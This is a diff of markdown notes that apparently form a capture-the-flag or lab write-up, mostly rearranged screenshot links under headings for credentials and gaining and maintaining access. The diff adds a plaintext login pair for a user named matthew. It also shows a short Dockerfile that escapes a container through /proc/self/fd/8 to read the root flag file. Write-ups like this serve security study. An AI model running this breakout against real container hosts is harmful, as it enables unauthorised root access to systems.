@@ -33,13 +33,8 @@ Creds
 
 ![](https://i.imgur.com/9Ta9Lmr.png)
 - ![](https://i.imgur.com/vQ9GJwL.png)
-
-![](https://i.imgur.com/AWInaLe.png)
-
-![](https://i.imgur.com/9GqOWbP.png)
-
 ### Gaining Access
-
+![](https://i.imgur.com/AWInaLe.png)
 
 ### Maintaining Access
 ![](https://i.imgur.com/mSy0k9Q.png)
@@ -48,15 +43,15 @@ Creds
 
 ![](https://i.imgur.com/UrgiKqY.png)
 
-- Matthew Password ???
-- ![](https://i.imgur.com/yMWWxEZ.png)
+>[!danger] Matthew Password ???
+- Using the `matthew : piper123` Logged in![](https://i.imgur.com/yMWWxEZ.png)
 ```shell
 FROM ubuntu:latest 
 WORKDIR /proc/self/fd/8
 RUN cat ../../../../root/root.txt
 ```
 ![](https://i.imgur.com/HoLNBxK.png)
-
+![](https://i.imgur.com/9GqOWbP.png)
 # Random Notes
 ```c
 # Use the official Node.js 14 image as the base image 
